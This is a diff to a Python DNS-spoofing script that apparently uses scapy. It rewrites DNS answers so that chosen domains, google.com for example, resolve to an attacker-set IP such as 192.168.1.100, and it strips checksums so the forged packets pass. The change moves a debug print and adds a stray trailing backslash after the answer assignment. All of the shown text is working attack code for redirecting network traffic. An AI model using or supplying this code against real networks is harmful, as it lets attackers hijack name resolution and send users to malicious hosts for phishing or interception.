@@ -63,11 +63,12 @@ class DNS:
             # we don't wanna modify that
             print("no modification:", qname)
             return packet
+        else:
+            print("Did modification", qname)
         # craft new answer, overriding the original
         # setting the rdata for the IP we want to redirect (spoofed)
         # for instance, google.com will be mapped to "192.168.1.100"
-        packet[DNS].an = DNSRR(rrname=qname, rdata=self.map[qname])
-        print("Did modification:",qname)
+        packet[DNS].an = DNSRR(rrname=qname, rdata=self.map[qname])\
         # set the answer count to 1
         packet[DNS].ancount = 1
         # delete checksums and length of packet, because we have modified the packet
